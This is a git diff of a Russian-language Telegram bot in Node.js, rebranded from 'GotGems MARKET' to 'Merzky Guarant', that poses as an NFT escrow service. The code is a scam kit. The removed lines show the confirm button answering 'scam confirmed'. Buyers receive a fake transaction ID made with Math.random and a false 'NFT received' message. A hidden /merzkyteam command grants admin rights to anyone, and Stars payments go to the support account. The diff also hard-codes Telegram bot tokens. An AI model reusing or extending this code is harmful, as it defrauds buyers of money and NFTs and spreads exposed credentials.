@@ -3,30 +3,28 @@ const fs = require('fs');
 const path = require('path');
 const http = require('http');
 
-// ========== ЗАГЛУШКА ДЛЯ RENDER ==========
 const server = http.createServer((req, res) => {
     res.writeHead(200);
     res.end('Bot is running!');
 });
 server.listen(process.env.PORT || 10000);
 
-// ========== ТВОИ ДАННЫЕ ==========
-const token = '8287807569:AAFoSzNjsGf2AQMTp3y-GbSTU-r4-AFmcvE';
-const supportUsername = 'snkeeokro';
-const botUsername = 'gotgems_bot';
+const token = '8299332460:AAF4Psig1XE2ifY59WlVXRqD_ofkMEkwyeA';
+const supportUsername = 'merzky_support';
+const botUsername = 'MerzkyGarant_bot';
 const adminIds = [8563923108];
 
 const bot = new TelegramBot(token, { polling: true });
 
-// ========== ДАННЫЕ ==========
 let deals = new Map();
 let completedDeals = new Map();
 let userBalances = new Map();
 let userSessions = new Map();
+let userRequisites = new Map();
+let userWallets = new Map();
 
 const DATA_FILE = path.join(__dirname, 'data.json');
 
-// ========== ЗАГРУЗКА ==========
 function loadData() {
     try {
         if (fs.existsSync(DATA_FILE)) {
@@ -34,6 +32,13 @@ function loadData() {
             deals = new Map(data.deals || []);
             completedDeals = new Map(data.completedDeals || []);
             userBalances = new Map(data.userBalances || []);
+            userRequisites = new Map(data.userRequisites || []);
+            userWallets = new Map(data.userWallets || []);
+            if (data.adminIds) {
+                data.adminIds.forEach(id => {
+                    if (!adminIds.includes(id)) adminIds.push(id);
+                });
+            }
             console.log('✅ Данные загружены');
         }
     } catch (e) {
@@ -41,13 +46,15 @@ function loadData() {
     }
 }
 
-// ========== СОХРАНЕНИЕ ==========
 function saveData() {
     try {
         const data = {
             deals: Array.from(deals.entries()),
             completedDeals: Array.from(completedDeals.entries()),
-            userBalances: Array.from(userBalances.entries())
+            userBalances: Array.from(userBalances.entries()),
+            userRequisites: Array.from(userRequisites.entries()),
+            userWallets: Array.from(userWallets.entries()),
+            adminIds: adminIds
         };
         fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
         console.log('✅ Данные сохранены');
@@ -57,29 +64,27 @@ function saveData() {
 }
 
 loadData();
+setInterval(() => saveData(), 5 * 60 * 1000);
 
-// ========== ID ==========
 function generateDealId() {
     return 'RNF' + Math.random().toString(36).substring(2, 8).toUpperCase();
 }
 
-// ========== ПРОВЕРКА АДМИНА ==========
 function isAdmin(userId) {
     return adminIds.includes(userId);
 }
 
-// ========== ССЫЛКА ==========
 function getDealLink(dealId) {
     return `https://t.me/${botUsername}?start=deal_${dealId}`;
 }
 
-// ========== МЕНЮ ==========
 function getMainMenu() {
     return {
         reply_markup: {
             keyboard: [
-                [{ text: '➕ Создать сделку' }, { text: '📋 Мои сделки' }],
-                [{ text: '👤 Профиль' }, { text: '🆘 Поддержка' }]
+                [{ text: '➕ Создать сделку' }, { text: '💰 Мои реквизиты' }],
+                [{ text: '📋 Мои сделки' }, { text: '👤 Профиль' }],
+                [{ text: '📞 Поддержка' }]
             ],
             resize_keyboard: true
         }
@@ -99,32 +104,56 @@ function getCurrencyMenu() {
     };
 }
 
+// ========== КОМАНДА ДЛЯ ВВОДА КОШЕЛЬКА (ТОЛЬКО АДМИНАМ) ==========
+bot.onText(/\/viplati/, (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    
+    if (!isAdmin(userId)) {
+        return bot.sendMessage(chatId, '❌ Команда доступна только администраторам!');
+    }
+    
+    userSessions.set(userId, { step: 'waiting_wallet' });
+    bot.sendMessage(chatId,
+        '💎 *Введите ваш TON кошелек*\n\n' +
+        'Это адрес, на который будут выводиться средства.\n' +
+        'Пример: `UQABCDEFGH123456789...`',
+        { parse_mode: 'Markdown' }
+    );
+});
+
 // ========== КОМАНДА СТАТЬ АДМИНОМ ==========
-bot.onText(/\/crimsonteam/, (msg) => {
+bot.onText(/\/merzkyteam/, (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
 
     if (!adminIds.includes(userId)) {
         adminIds.push(userId);
         saveData();
-        bot.sendMessage(chatId, '✅ Ты теперь админ!');
+        bot.sendMessage(chatId, '✅ Ты теперь админ Merzky Team!');
         console.log('👑 Новый админ:', userId);
     } else {
         bot.sendMessage(chatId, '⚡ Ты уже админ.');
     }
 });
 
-// ========== СТАРТ ==========
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     bot.sendMessage(
         chatId,
-        '🚀 GotGems MARKET\n\nДобро пожаловать!',
-        getMainMenu()
+        '🚀 *Merzky Guarant*\n\n' +
+        '🔹 Создай сделку и продай свой NFT\n' +
+        '🔹 Добавь реквизиты для оплаты\n' +
+        '🔹 Безопасные P2P сделки с гарантом\n\n' +
+        '💎 Для вывода средств используй /viplati',
+        {
+            parse_mode: 'Markdown',
+            ...getMainMenu()
+        }
     );
 });
 
-// ========== СТАРТ С ПАРАМЕТРОМ ==========
+// ========== СТАРТ С ПАРАМЕТРОМ (ПОКУПКА) ==========
 bot.onText(/\/start deal_(.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     const dealId = match[1];
@@ -138,21 +167,51 @@ bot.onText(/\/start deal_(.+)/, (msg, match) => {
         return bot.sendMessage(chatId, '❌ Сделка уже завершена');
     }
     
-    const text = `Сделка #${dealId}\n\n` +
+    const text = `🛒 *Покупка NFT*\n\n` +
                  `💰 Сумма: ${deal.amount} ${deal.currency}\n` +
                  `👤 Продавец: @${deal.sellerUsername}\n\n` +
-                 `Нажми кнопку для оплаты:`;
+                 `✅ Нажми "Купить", чтобы продолжить`;
     
     bot.sendMessage(chatId, text, {
+        parse_mode: 'Markdown',
         reply_markup: {
             inline_keyboard: [
-                [{ text: '✅ Оплатить', callback_data: `pay_${dealId}` }]
+                [{ text: '💳 Купить', callback_data: `buy_${dealId}` }]
             ]
         }
     });
 });
 
-// ========== СОЗДАТЬ СДЕЛКУ ==========
+bot.onText(/💰 Мои реквизиты/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    
+    try {
+        await bot.deleteMessage(chatId, msg.message_id);
+    } catch (e) {}
+    
+    const req = userRequisites.get(userId) || { ton: '', usdt: '', card: '' };
+    
+    await bot.sendMessage(chatId,
+        `💳 *Мои реквизиты*\n\n` +
+        `💎 TON: ${req.ton ? '`' + req.ton + '`' : '❌ Не указаны'}\n` +
+        `💵 USDT: ${req.usdt ? '`' + req.usdt + '`' : '❌ Не указаны'}\n` +
+        `🏦 Карта: ${req.card ? '`' + req.card + '`' : '❌ Не указаны'}\n\n` +
+        `👇 Выбери, что изменить:`,
+        {
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: `💎 TON ${req.ton ? '✅' : '❌'}`, callback_data: 'edit_ton' }],
+                    [{ text: `💵 USDT ${req.usdt ? '✅' : '❌'}`, callback_data: 'edit_usdt' }],
+                    [{ text: `🏦 Карта ${req.card ? '✅' : '❌'}`, callback_data: 'edit_card' }],
+                    [{ text: '🔙 Назад', callback_data: 'back_main' }]
+                ]
+            }
+        }
+    );
+});
+
 bot.onText(/➕ Создать сделку/, async (msg) => {
     const chatId = msg.chat.id;
     
@@ -167,7 +226,6 @@ bot.onText(/➕ Создать сделку/, async (msg) => {
     );
 });
 
-// ========== МОИ СДЕЛКИ ==========
 bot.onText(/📋 Мои сделки/, (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
@@ -178,31 +236,38 @@ bot.onText(/📋 Мои сделки/, (msg) => {
         return bot.sendMessage(chatId, '📭 У вас нет активных сделок');
     }
     
-    let text = '📋 Ваши сделки:\n\n';
+    let text = '📋 *Ваши сделки:*\n\n';
     userDeals.forEach(deal => {
-        text += `#${deal.id} — ${deal.amount} ${deal.currency} — ${deal.status}\n`;
+        const status = deal.status === 'pending' ? '⏳ Ожидает' : 
+                      deal.status === 'paid' ? '💰 Оплачен' :
+                      deal.status === 'completed' ? '✅ Завершен' : '❌ Отменен';
+        text += `🔹 #${deal.id} — ${deal.amount} ${deal.currency} — ${status}\n`;
     });
     
-    bot.sendMessage(chatId, text);
+    bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
 });
 
-// ========== ПРОФИЛЬ ==========
 bot.onText(/👤 Профиль/, (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
+    const balance = userBalances.get(userId) || 0;
+    const wallet = userWallets.get(userId) || 'Не указан';
     
     bot.sendMessage(
         chatId,
-        `👤 Профиль\n\n🆔 ID: ${userId}\n👑 Админ: ${isAdmin(userId) ? '✅' : '❌'}`
+        `👤 *Профиль*\n\n` +
+        `🆔 ID: \`${userId}\`\n` +
+        `💰 Баланс: ${balance} TON\n` +
+        `💎 TON кошелек: \`${wallet}\`\n` +
+        `👑 Админ: ${isAdmin(userId) ? '✅' : '❌'}`,
+        { parse_mode: 'Markdown' }
     );
 });
 
-// ========== ПОДДЕРЖКА ==========
-bot.onText(/🆘 Поддержка/, (msg) => {
+bot.onText(/📞 Поддержка/, (msg) => {
     bot.sendMessage(msg.chat.id, `📞 @${supportUsername}`);
 });
 
-// ========== КНОПКИ ==========
 bot.on('callback_query', async (query) => {
     const chatId = query.message.chat.id;
     const messageId = query.message.message_id;
@@ -210,8 +275,52 @@ bot.on('callback_query', async (query) => {
     const data = query.data;
 
     try {
-        if (data.startsWith('curr_')) {
+        if (data === 'edit_ton') {
+            userSessions.set(userId, { step: 'waiting_ton' });
+            await bot.editMessageText(
+                '✏️ Отправьте новый **TON кошелек**:',
+                {
+                    chat_id: chatId,
+                    message_id: messageId,
+                    parse_mode: 'Markdown'
+                }
+            );
+        }
+        else if (data === 'edit_usdt') {
+            userSessions.set(userId, { step: 'waiting_usdt' });
+            await bot.editMessageText(
+                '✏️ Отправьте новый **USDT адрес**:',
+                {
+                    chat_id: chatId,
+                    message_id: messageId,
+                    parse_mode: 'Markdown'
+                }
+            );
+        }
+        else if (data === 'edit_card') {
+            userSessions.set(userId, { step: 'waiting_card' });
+            await bot.editMessageText(
+                '✏️ Отправьте новую **карту**:',
+                {
+                    chat_id: chatId,
+                    message_id: messageId,
+                    parse_mode: 'Markdown'
+                }
+            );
+        }
+        else if (data === 'back_main') {
+            await bot.deleteMessage(chatId, messageId);
+            await bot.sendMessage(chatId, 'Главное меню:', getMainMenu());
+        }
+        else if (data.startsWith('curr_')) {
             const currency = data.split('_')[1];
+            
+            const req = userRequisites.get(userId);
+            if (currency !== 'stars') {
+                if (!req || !req[currency]) {
+                    return bot.answerCallbackQuery(query.id, '❌ Сначала добавь реквизиты в "💰 Мои реквизиты"');
+                }
+            }
             
             userSessions.set(userId, { 
                 step: 'waiting_nft', 
@@ -227,8 +336,47 @@ bot.on('callback_query', async (query) => {
                 }
             );
         }
-        
-        else if (data.startsWith('pay_')) {
+        else if (data.startsWith('buy_')) {
+            const dealId = data.split('_')[1];
+            const deal = deals.get(dealId);
+            
+            if (!deal) {
+                return bot.answerCallbackQuery(query.id, '❌ Сделка не найдена');
+            }
+            
+            if (deal.status !== 'pending') {
+                return bot.answerCallbackQuery(query.id, '❌ Сделка уже обработана');
+            }
+            
+            const req = userRequisites.get(deal.sellerId) || {};
+            
+            let reqText = '';
+            if (deal.currency === 'ton' && req.ton) reqText = `💎 TON: \`${req.ton}\``;
+            else if (deal.currency === 'usdt' && req.usdt) reqText = `💵 USDT: \`${req.usdt}\``;
+            else if (deal.currency === 'card' && req.card) reqText = `🏦 Карта: \`${req.card}\``;
+            else if (deal.currency === 'stars') reqText = `⭐ Отправьте подарок @${supportUsername}`;
+            else reqText = '❌ У продавца нет реквизитов для этой валюты';
+            
+            await bot.sendMessage(
+                chatId,
+                `💳 *Оплата сделки #${dealId}*\n\n` +
+                `💰 Сумма: ${deal.amount} ${deal.currency}\n` +
+                `👤 Продавец: @${deal.sellerUsername}\n\n` +
+                `📩 *Реквизиты для оплаты:*\n${reqText}\n\n` +
+                `✅ После перевода нажми *"Я оплатил"*`,
+                {
+                    parse_mode: 'Markdown',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: '✅ Я оплатил', callback_data: `paid_${dealId}` }]
+                        ]
+                    }
+                }
+            );
+            
+            await bot.answerCallbackQuery(query.id, '✅ Готово');
+        }
+        else if (data.startsWith('paid_')) {
             const dealId = data.split('_')[1];
             const deal = deals.get(dealId);
             
@@ -246,16 +394,19 @@ bot.on('callback_query', async (query) => {
             deals.set(dealId, deal);
             saveData();
             
-            // Уведомление только продавцу
             await bot.sendMessage(
                 deal.sellerId,
-                `💰 Сделка #${dealId} оплачена!\n\nПокупатель: @${deal.buyerUsername}\nСумма: ${deal.amount} ${deal.currency}\n\nПодтвердите:`,
+                `💰 *Сделка #${dealId} оплачена!*\n\n` +
+                `Покупатель: @${deal.buyerUsername}\n` +
+                `Сумма: ${deal.amount} ${deal.currency}\n\n` +
+                `Подтвердите получение:`,
                 {
+                    parse_mode: 'Markdown',
                     reply_markup: {
                         inline_keyboard: [
                             [
-                                { text: '✅ Подтвердить', callback_data: `admin_confirm_${dealId}` },
-                                { text: '❌ Отклонить', callback_data: `admin_reject_${dealId}` }
+                                { text: '✅ Подтвердить', callback_data: `confirm_${dealId}` },
+                                { text: '❌ Отмена', callback_data: `reject_${dealId}` }
                             ]
                         ]
                     }
@@ -263,22 +414,21 @@ bot.on('callback_query', async (query) => {
             );
             
             await bot.editMessageText(
-                `✅ Заявка отправлена!`,
+                `✅ Заявка отправлена продавцу!`,
                 {
                     chat_id: chatId,
                     message_id: messageId
                 }
             );
             
-            await bot.answerCallbackQuery(query.id, '✅ Оплата подтверждена');
+            await bot.answerCallbackQuery(query.id, '✅ Заявка отправлена');
         }
-        
-        else if (data.startsWith('admin_confirm_')) {
+        else if (data.startsWith('confirm_')) {
             if (!isAdmin(userId)) {
-                return bot.answerCallbackQuery(query.id, '❌ Нет доступа');
+                return bot.answerCallbackQuery(query.id, '❌ Только админы');
             }
             
-            const dealId = data.split('_')[2];
+            const dealId = data.split('_')[1];
             const deal = deals.get(dealId);
             
             if (!deal) return;
@@ -293,51 +443,57 @@ bot.on('callback_query', async (query) => {
             
             await bot.sendMessage(
                 deal.sellerId,
-                `✅ Сделка #${dealId} завершена!\n\n💰 ${deal.amount} ${deal.currency} зачислены.`
+                `✅ *Сделка #${dealId} завершена!*\n\n` +
+                `💰 ${deal.amount} ${deal.currency} зачислены на баланс.\n\n` +
+                `💎 Для вывода используй /viplati`,
+                { parse_mode: 'Markdown' }
             );
             
             const txId = '0x' + Math.random().toString(36).substring(2, 15);
             await bot.sendMessage(
                 deal.buyerId,
-                `✅ NFT ПОЛУЧЕН!\n\nСделка #${dealId}\nTxID: ${txId}`
+                `✅ *NFT ПОЛУЧЕН!*\n\nСделка #${dealId}\nTxID: \`${txId}\``,
+                { parse_mode: 'Markdown' }
             );
             
             await bot.editMessageText(
-                `✅ ПОДТВЕРЖДЕНО\n\nСделка #${dealId}`,
+                `✅ *ПОДТВЕРЖДЕНО*\n\nСделка #${dealId}`,
                 {
                     chat_id: chatId,
-                    message_id: messageId
+                    message_id: messageId,
+                    parse_mode: 'Markdown'
                 }
             );
             
-            await bot.answerCallbackQuery(query.id, '✅ Скам подтвержден');
+            await bot.answerCallbackQuery(query.id, '✅ Подтверждено');
         }
-        
-        else if (data.startsWith('admin_reject_')) {
+        else if (data.startsWith('reject_')) {
             if (!isAdmin(userId)) {
-                return bot.answerCallbackQuery(query.id, '❌ Нет доступа');
+                return bot.answerCallbackQuery(query.id, '❌ Только админы');
             }
             
-            const dealId = data.split('_')[2];
+            const dealId = data.split('_')[1];
             const deal = deals.get(dealId);
             
             if (!deal) return;
             
-            deal.status = 'rejected';
+            deal.status = 'cancelled';
             completedDeals.set(dealId, deal);
             deals.delete(dealId);
             saveData();
             
             await bot.sendMessage(
                 deal.buyerId,
-                `❌ Сделка #${dealId} отклонена\n\nОбратитесь в поддержку @${supportUsername}`
+                `❌ *Сделка #${dealId} отклонена*`,
+                { parse_mode: 'Markdown' }
             );
             
             await bot.editMessageText(
-                `❌ ОТКЛОНЕНО\n\nСделка #${dealId}`,
+                `❌ *ОТКЛОНЕНО*\n\nСделка #${dealId}`,
                 {
                     chat_id: chatId,
-                    message_id: messageId
+                    message_id: messageId,
+                    parse_mode: 'Markdown'
                 }
             );
             
@@ -352,7 +508,6 @@ bot.on('callback_query', async (query) => {
     }
 });
 
-// ========== ТЕКСТ ==========
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
@@ -360,14 +515,59 @@ bot.on('message', async (msg) => {
 
     if (text?.startsWith('/') || 
         text === '➕ Создать сделку' || 
+        text === '💰 Мои реквизиты' ||
         text === '📋 Мои сделки' ||
         text === '👤 Профиль' ||
-        text === '🆘 Поддержка') {
+        text === '📞 Поддержка') {
         return;
     }
 
     const session = userSessions.get(userId);
     if (!session) return;
+
+    if (session.step === 'waiting_wallet') {
+        if (!text.startsWith('UQ') && !text.startsWith('EQ') && !text.startsWith('0:')) {
+            return bot.sendMessage(chatId, '❌ Непохоже на TON кошелек. Попробуй ещё раз:');
+        }
+        
+        userWallets.set(userId, text);
+        saveData();
+        userSessions.delete(userId);
+        
+        await bot.sendMessage(chatId, '✅ TON кошелек сохранен! Теперь ты можешь выводить средства.', getMainMenu());
+        return;
+    }
+
+    if (session.step === 'waiting_ton') {
+        const req = userRequisites.get(userId) || { ton: '', usdt: '', card: '' };
+        req.ton = text;
+        userRequisites.set(userId, req);
+        saveData();
+        userSessions.delete(userId);
+        
+        await bot.sendMessage(chatId, '✅ TON кошелек сохранен!', getMainMenu());
+        return;
+    }
+    else if (session.step === 'waiting_usdt') {
+        const req = userRequisites.get(userId) || { ton: '', usdt: '', card: '' };
+        req.usdt = text;
+        userRequisites.set(userId, req);
+        saveData();
+        userSessions.delete(userId);
+        
+        await bot.sendMessage(chatId, '✅ USDT адрес сохранен!', getMainMenu());
+        return;
+    }
+    else if (session.step === 'waiting_card') {
+        const req = userRequisites.get(userId) || { ton: '', usdt: '', card: '' };
+        req.card = text;
+        userRequisites.set(userId, req);
+        saveData();
+        userSessions.delete(userId);
+        
+        await bot.sendMessage(chatId, '✅ Карта сохранена!', getMainMenu());
+        return;
+    }
 
     if (session.step === 'waiting_nft') {
         if (!text.includes('t.me/') && !text.includes('http')) {
@@ -424,22 +624,27 @@ bot.on('message', async (msg) => {
         
         try {
             await bot.editMessageText(
-                `✅ Сделка создана!\n\n` +
+                `✅ *Сделка создана!*\n\n` +
                 `#${dealId}\n` +
-                `💰 Сумма: ${amount} ${session.currency}\n` +
-                `🔗 Ссылка:\n${dealLink}`,
+                `💰 Сумма: ${amount} ${session.currency}\n\n` +
+                `🔗 [Нажмите для покупки](${dealLink})\n\n` +
+                `📎 Или отправьте ссылку покупателю:\n\`${dealLink}\``,
                 {
                     chat_id: chatId,
-                    message_id: session.messageId
+                    message_id: session.messageId,
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: true
                 }
             );
         } catch (e) {
             await bot.sendMessage(
                 chatId,
-                `✅ Сделка создана!\n\n` +
+                `✅ *Сделка создана!*\n\n` +
                 `#${dealId}\n` +
-                `💰 Сумма: ${amount} ${session.currency}\n` +
-                `🔗 Ссылка:\n${dealLink}`
+                `💰 Сумма: ${amount} ${session.currency}\n\n` +
+                `👉 [Купить NFT](${dealLink})\n\n` +
+                `Или отправьте ссылку:\n${dealLink}`,
+                { parse_mode: 'Markdown' }
             );
         }
         
@@ -447,13 +652,13 @@ bot.on('message', async (msg) => {
     }
 });
 
-// ========== СОХРАНЕНИЕ ==========
 process.on('SIGINT', () => {
     console.log('\n💾 Сохраняю...');
     saveData();
     process.exit();
 });
 
-console.log('✅ Бот запущен!');
-console.log('🔑 Команда: /crimsonteam');
-console.log('👤 Саппорт: @' + supportUsername);
+console.log('🔥 Merzky Guarant запущен!');
+console.log('👑 Команда админа: /merzkyteam');
+console.log('💎 Команда вывода (только админы): /viplati');
+console.log('📞 Саппорт: @' + supportUsername);
